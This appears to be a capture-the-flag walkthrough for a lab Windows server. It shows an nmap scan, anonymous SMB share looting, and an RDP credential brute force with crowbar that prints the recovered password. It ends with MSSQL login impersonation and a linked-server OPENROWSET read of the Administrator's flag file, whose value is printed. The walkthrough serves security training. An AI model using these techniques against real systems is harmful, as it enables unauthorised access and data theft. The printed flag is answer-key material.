# Attacking Common Services - Hard

The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

## Walkthrough

```bash
sudo nmap -sS -n -Pn -p- --min-rate 5000 10.129.203.10 -oN nmap.txt
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

lets check smb share

<pre class="language-bash"><code class="lang-bash">smbclient -L //10.129.203.10 -N
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
# Download the folder and its contents recursively
recurse ON
<strong>prompt OFF
</strong>mget *
exit
</code></pre>

lets look around now

```bash
#in IT folder there is creds and notes
random.txt
#lets brute force rdp
crowbar -b rdp -s 10.129.203.10/32 -u fiona -C ../IT/Fiona/creds.txt 
2024-02-23 04:17:58 RDP-SUCCESS : 10.129.203.10:3389 - fiona:48Ns72!bns74@S84NNNSl
```

Once logged in, what other user can we compromise to gain admin privileges?

```sql
xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /cert-ignore /dynamic-resolution
#IN CMD
sqlcmd
select name from master.dbo.sysdatabases
go
use master
go
#now to impersonate as another user
select distinct b.name
from sys.server_permissions a
inner join sys.server_principals b
on a.grantor_principal_id = b.principal_id
where a.permission_name = 'IMPERSONATE'
go
execute as login = 'john'
select system_user
select is_srvrolemember('sysadmin')
go
```

Submit the contents of the flag.txt file on the Administrator Desktop.

```sql
select srvname, isremote from sysservers
go
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE('SELECT * FROM OPENROWSET(BULK ''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV]
go
HTB{46u$!n9_l!nk3d_$3rv3r$} 
```
